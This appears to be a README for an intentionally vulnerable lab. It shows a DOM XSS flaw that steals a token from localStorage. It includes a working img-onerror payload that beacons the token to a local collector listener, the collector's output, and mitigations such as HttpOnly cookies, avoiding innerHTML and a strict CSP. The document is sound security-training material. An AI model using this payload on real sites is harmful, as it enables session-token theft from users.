# A3 — DOM XSS → token theft

| | |
|---|---|
| **OWASP** | A03:2021 – Injection (Cross-Site Scripting) |
| **MITRE ATT&CK** | T1189 – Drive-by Compromise; T1539 – Steal Web Session Cookie/Token |
| **STRIDE** | Spoofing (see `threat-models/transfer-flow.stride.md`, threat #5) |
| **Scope** | Frontend, vuln/* branch only |

## The vulnerability

Two anti-patterns combine (see [`vulnerable.html`](vulnerable.html)):

1. the access token is stored in **`localStorage`** (readable by any script), and
2. a URL parameter is written to the DOM via **`innerHTML`** with no sanitization.

An injected `<img onerror>` runs attacker JS, reads the token from `localStorage`, and
beacons it to the attacker.

## Run the exploit

```bash
python attacks/A3/collector.py          # terminal 1 — attacker listener (:9099)
```

Then open the vulnerable page with the payload (URL-encoded):

```
attacks/A3/vulnerable.html?msg=<img src=x onerror="new Image().src='http://localhost:9099/steal?t='+encodeURIComponent(localStorage.getItem('access_token'))">
```

The `<img>` fails to load → `onerror` fires → the token is read from `localStorage` and sent
to the collector, which prints:

```
[!] STOLEN TOKEN received: SYNTHETIC.JWT.value-pretend-this-is-real
```

See [`evidence.txt`](evidence.txt).

## The fix (M4)

- Keep the token in an **HttpOnly + Secure + SameSite** cookie (a BFF), never `localStorage`
  — JS then cannot read it (CLAUDE.md non-negotiable #4). *(This is exactly STRIDE threat #5,
  currently open because the M1 SPA uses `keycloak-js`.)*
- Never use `innerHTML` with untrusted input; rely on Angular interpolation / the
  DomSanitizer; encode output.
- Send a strict **Content-Security-Policy** (`script-src 'self' 'nonce-…'`, no inline) so an
  injected inline handler cannot execute.

DoD check **T5** in the threat model.
